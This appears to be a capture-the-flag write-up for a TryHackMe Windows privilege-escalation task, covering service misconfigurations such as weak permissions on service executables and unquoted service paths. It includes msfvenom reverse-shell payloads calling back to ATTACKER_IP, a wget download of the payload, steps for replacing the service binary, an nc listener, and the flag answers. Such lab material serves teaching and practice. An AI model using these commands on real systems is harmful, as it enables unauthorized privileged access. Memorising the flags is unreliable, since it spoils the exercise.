**TASK 5: Abusing Service Misconfigurations**

# Windows Services 

Windows services are managed by Service Control Manager (SCM) The task of SCM is that it oversees the status and cofiguration of services.Each
service has a linked executable that the SCM runs when the service starts. Not all executables can function as services,
as they need special functions to communicate with the SCM. The user account under which a service operates is also specified by each service.

For understanding it better lets run this command:

    sc qc apphostsvc


Two things to notice after running the scans are

- BINARY_PATH_NAME
- SERVICE_START_NAME
  
![unpriv](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/d5955087-75d3-4462-b4d3-e5a34177a819)

# Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand the woking lets run the following commands :

    sc qc WindowsScheduler

![Screenshot 2023-10-23 232127](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/c050b461-3342-4da2-88d5-932dfd449a11)


Now we can see that `C:\PROGRA~2\SYSTEM~1\WService.exe` is the vuln that we are looking for after this lets see who all can access this for doing so we can simply copy and paste the name of the file 
and add prefix as `icacls`.


We can see that anyone can modify this file so now lets try to gain reverse shell access using `metasploit`


      msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe


After creating the file open the python server :

      python -m http.server

Now tranfer the file to the target machine by using the **Powershell cmd**


      wget http://<ip>:8000/rev-svc.exe -O rev-svc.exe

**Make sure to cross check the file name**


After going through each and everystep this should what your screen look like :0

![Screenshot 2023-10-23 235127](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/8b94aaa0-f90f-4f81-ae86-3dbba49df7d2)

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, 
we'll want to grant full permissions to the Everyone group as well.

- `cd C:\PROGRA~2\SYSTEM~1\`
- `move WService.exe WService.exe.bkp`
- `move C:\Users\thm-unpriv\rev-svc.exe WService.exe`
- `move C:\Users\thm-unpriv\rev-svc.exe WService.exe`

Now we will start reverse listener :

    nc -lnvp 4445

And then we will restart the services on the traget machine and we will be able to gain reverse shell.

**Q. Get the flag on svcusr1's desktop.**

Ans: The command will be:

    type C:\Users\svcusr1\Desktop\flag.txt

**THM{AT_YOUR_SERVICE}**
![Screenshot 2023-10-24 000100](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/bbfdba0d-cc01-496e-8fda-dc75e0911ea3)

**Dont close the http server cause we will be using that again..**

# Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

Read the task description from THM website and follow all the steps..


**Q. Get the flag on svcusr2's desktop.**


For this we will use the same proccess that we did above we will create a file using `msfvenom` 

      msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
  
and then we will move this file in the target machine and then we will check for the flag.


The whole proccess will look something like this

![Screenshot 2023-10-24 003049](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/54000530-ae13-4a6f-9e75-80b7b26bf369)


**Q. Get the flag on the Administrator's desktop.**

Create the payload using 

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4447 -f exe-service -o rev-svc3.exe

Then follow the same proccess send the file to the target machine using the python http server and then and open a listener in your machine..

Then after getting a successful reverse connection use this command to get the flag:


    type C:\Users\Administrator\Desktop\flag.txt

![image](https://github.com/Anirudh-Saxena/Windows-Privilege-Escalation-WriteUP/assets/73027020/4e296f63-8416-4944-b76d-a2c2c7f2d1c5)




